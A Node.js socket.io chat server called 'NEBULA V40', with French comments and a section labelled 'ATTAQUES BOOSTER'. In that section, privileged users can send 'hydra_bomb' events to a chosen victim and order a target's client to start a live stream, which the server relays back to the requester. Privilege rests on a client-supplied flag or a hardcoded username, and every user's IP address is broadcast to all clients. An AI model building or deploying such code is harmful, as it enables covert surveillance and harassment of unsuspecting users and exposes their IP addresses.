const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const PORT = process.env.PORT || 3000;

let registry = { users: {}, rooms: {}, blacklist: new Set() };

app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('init_user', (data) => {
        if (registry.blacklist.has(ip)) return socket.disconnect();
        const isChef = data.name === "toucheur2pp";
        registry.users[socket.id] = {
            id: socket.id, 
            name: data.name, 
            ip: ip, 
            premium: isChef || data.isPremium,
            chef: isChef,
            room: 'global',
            friends: []
        };
        socket.join('global');
        sync();
    });

    // --- SYSTÈME DE SALONS ---
    socket.on('join_room', (roomName) => {
        const u = registry.users[socket.id];
        if (u.premium) {
            socket.leave(u.room);
            u.room = roomName;
            socket.join(roomName);
            socket.emit('chat_msg', { system: true, text: `BIENVENUE DANS LE SALON PRIVÉ : ${roomName}` });
        }
    });

    // --- ATTAQUES BOOSTER ---
    socket.on('hydra_bomb', (targetSid) => {
        if (registry.users[socket.id]?.premium) {
            io.to(targetSid).emit('execute_hydra', { by: registry.users[socket.id].name });
        }
    });

    socket.on('request_live_stream', (targetSid) => {
        if (registry.users[socket.id]?.premium) io.to(targetSid).emit('force_stream_start', socket.id);
    });

    socket.on('stream_chunk', (data) => {
        io.to(data.to).emit('receive_stream', { from: socket.id, buffer: data.buffer });
    });

    socket.on('chat_msg', (msg) => {
        const u = registry.users[socket.id];
        if (u) io.to(u.room).emit('chat_msg', { 
            text: msg.text, 
            name: u.name, 
            premium: u.premium, 
            chef: u.chef 
        });
    });

    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });
    function sync() { io.emit('sync_users', Object.values(registry.users)); }
});

http.listen(PORT, () => console.log("NEBULA V40 ONLINE - PORT " + PORT));
